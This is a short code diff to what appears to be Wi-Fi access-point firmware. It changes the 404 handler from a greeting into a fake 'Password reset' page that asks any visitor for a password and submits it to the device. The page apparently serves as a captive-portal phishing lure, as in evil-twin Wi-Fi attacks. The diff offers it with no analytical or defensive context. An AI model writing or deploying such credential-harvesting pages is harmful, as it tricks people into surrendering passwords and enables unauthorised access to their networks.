@@ -78,7 +78,7 @@ namespace ap {
     }
 
     void handle_404() {
-        server.send(200, "text/plain", "Good morning, friend!");
+        server.send(200, "text/html", "<!Doctype html><html><head>    <meta charset=\"UTF-8\">    <title>Password reset</title>    <style>        * {            font-family: Arial, Helvetica, sans-serif;            font-size: 1.5rem;        }        section {            margin: 5rem auto;            width: 100%;            max-width: 640px;        }        input, label {            width: 100%;            margin: .5em 0;        }        input[type=\"password\"] {            background: #ccc;            border-radius: 4px;            border: none;        }        input[type=\"submit\"] {            background: #6eff00;            border-radius: 4px;            border: none;            padding: .5rem;            font-size: 1rem;        }    </style></head><body>    <section>        <form method=\"GET\">            <label>Password: </label>            <input type=\"password\" name=\"password\"/>            <input type=\"submit\">        </form>    </section></body></html>");
         
         debugF("> Client requests ");
         debug(server.uri());
